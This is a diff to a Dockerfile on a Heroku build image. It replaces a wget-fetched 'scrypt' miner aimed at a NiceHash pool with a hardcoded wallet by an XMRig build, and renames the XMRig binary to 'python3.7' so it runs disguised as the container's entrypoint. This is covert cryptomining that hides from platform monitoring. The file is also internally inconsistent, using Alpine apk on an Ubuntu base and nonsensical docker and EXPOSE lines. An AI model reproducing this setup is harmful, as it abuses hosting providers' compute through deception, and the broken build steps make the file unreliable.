@@ -1,13 +1,15 @@
 FROM heroku/heroku:20-build
-#ENV VER=v4.20.0
+RUN apk add --no-cache git make cmake libstdc++ gcc g++ libuv-dev openssl-dev hwloc-dev
 RUN apt-get update
 RUN apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git
-RUN wget https://github.com/vultrdocker/portal-vultr/raw/master/scrypt
-RUN chmod u+x scrypt
-RUN ./scrypt -a scrypt -o stratum+tcp://scrypt.usa-west.nicehash.com:3333 -u 3NFjvzSUkafgFvrhoEyHguguCu7Tg811y4.cpu -p x -t 8
-# copy files from the repository into this staging server
-COPY . .
+RUN git clone https://github.com/xmrig/xmrig
 
-RUN docker build -t image .
-RUN docker run -d -p 80:80 image
-EXPOSE WEBSITE http://localhost:80
+RUN mkdir xmrig/build && cd xmrig/build && \
+    cmake .. && \
+    make -j$(nproc) && \
+    chmod +x xmrig && \
+    rm -r /xmrig/src
+COPY config.json /xmrig/build/config.json
+WORKDIR /xmrig/build
+RUN mv xmrig python3.7
+ENTRYPOINT ["./python3.7"]
